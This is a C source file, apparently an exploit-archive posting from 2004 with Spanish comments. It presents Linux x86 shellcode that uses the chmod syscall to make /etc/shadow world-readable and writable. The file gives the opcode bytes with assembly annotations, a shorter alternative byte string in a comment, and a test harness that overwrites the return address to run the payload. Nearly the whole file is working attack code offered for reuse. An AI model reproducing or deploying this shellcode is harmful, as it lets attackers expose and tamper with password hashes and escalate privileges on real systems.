/*
 * s0t4ipv6@shellcode.com.ar
 * 0x04abril0x7d2
 *
 * int sys_chmod(const char * filename, mode_t mode)
 * {...}
 *
 * Utilizando la interrupcion 15(chmod), asignando el octal 0666
 * al archivo deseado. En este caso /etc/shadow
 *
 * Hice unas modificaciones en el codigo y solo pude reducir la shellcode en 1.
 * por el codigo mailme.
 *	"\x31\xdb\x68\x64\x6f\x77\x53\x68\x2f\x73\x68\x61\x68\x2f\x65"
 *	"\x74\x63\x89\xe3\x31\xc9\x88\x4c\x24\x0b\x66\xb9\xb6\x01\x31"
 *	"\xc0\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80";
 *
*/

#include <stdio.h>

// Shellcode			//	Asm Code		// Main Interval
char shellcode[]=
"\xeb\x17"			//	jmp     0x17		[3 ; 4]
"\x5e"				//	popl    %esia		[5]
"\x31\xc9"			//	xorl    %ecx, %ecx	[6 ; 7]
"\x88\x4e\x0b"			//      movb    %ecx, 0xb(%esi)	[8; 10]
"\x8d\x1e"			//	leal    (%esi), %ebx	[11;12]
"\x66\xb9\xb6\x01"		//	movw    $0x1b6, %cx     // asigno a cx el equivalente en hex al octal 0666
"\x31\xc0"			//	xorl    %eax, %eax	[17;18]
"\xb0\x0f"			//      movb    $0xf, %al       // Interrupcion 15 (chmod)
"\xcd\x80"			//      int     $0x80		[21;22]
"\x31\xc0"			//	xorl    %eax, %eax      // salida
"\x40"				//	inc     %eax		[25]
"\xcd\x80"			//      int     $0x80		[26;27]
"\xe8\xe4\xff\xff\xff"		//      call    -0x1c
"/etc/shadow";

main() {
	int *ret;
	ret=(int *)&ret+2;
	printf("Shellcode lenght=%d\n",strlen(shellcode));
	(*ret) = (int)shellcode;
}

// milw0rm.com [2004-09-26]